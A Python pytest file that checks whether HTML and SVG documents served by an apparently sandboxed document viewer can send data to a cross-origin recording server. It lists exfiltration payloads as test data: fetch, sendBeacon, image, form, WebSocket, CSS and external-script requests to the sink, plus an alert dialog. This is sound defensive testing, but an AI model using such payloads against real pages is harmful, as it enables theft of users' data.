# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 Atacama <contact@atacama.tech>

"""A document cannot send data out (E1-E9).

Each document tries one channel towards the sink, a server on another origin
that records every request. The sink must see nothing. Navigation is not
covered: CSP cannot stop it (a known CSP limit).
"""

import pytest

import docs

ATTEMPTS = {
    "e1-fetch": "<script>fetch('{sink}/e1').catch(() => {{}});</script>",
    "e2-beacon": "<script>navigator.sendBeacon('{sink}/e2', 'x');</script>",
    "e3-image": "<script>new Image().src = '{sink}/e3';</script>",
    "e4-form": ("<form id='f' action='{sink}/e4' method='post'><input name='a' value='1'></form>"
                "<script>document.getElementById('f').submit();</script>"),
    "e5-websocket": "<script>try {{ new WebSocket('{ws}/e5'); }} catch (e) {{}}</script>",
    "e6-css": ("<style>@import url('{sink}/e6a.css'); body {{ background: url('{sink}/e6b.png'); }}"
               "</style>"),
    "e7-script": "<script src='{sink}/e7.js'></script>",
}


def html_doc(home_dir, name, body):
    return docs.write(home_dir, f"exfil/{name}.html",
                      f"<!doctype html><html><body><p id='ready'>ready</p>{body}</body></html>")


@pytest.mark.parametrize("name", sorted(ATTEMPTS))
async def test_html_document_cannot_reach_the_sink(page, mesh, sink, home_dir, name):
    body = ATTEMPTS[name].format(sink=sink.origin, ws=sink.origin.replace("http", "ws", 1))
    doc = html_doc(home_dir, name, body)
    await page.goto(await mesh.url(doc))
    await sink.assert_untouched()


async def test_e8_alert_shows_no_dialog(page, mesh, sink, home_dir):
    doc = html_doc(home_dir, "e8-alert", "<script>alert('phish');</script>")
    await page.goto(await mesh.url(doc))
    await page.wait_for_timeout(500)
    assert page.dialogs == []


async def test_e9_svg_script_cannot_reach_the_sink(page, mesh, sink, home_dir):
    doc = docs.write(home_dir, "exfil/e9.svg",
                     "<svg xmlns='http://www.w3.org/2000/svg'><script>"
                     f"fetch('{sink.origin}/e9').catch(() => {{}});</script></svg>")
    await page.goto(await mesh.url(doc))
    await sink.assert_untouched()
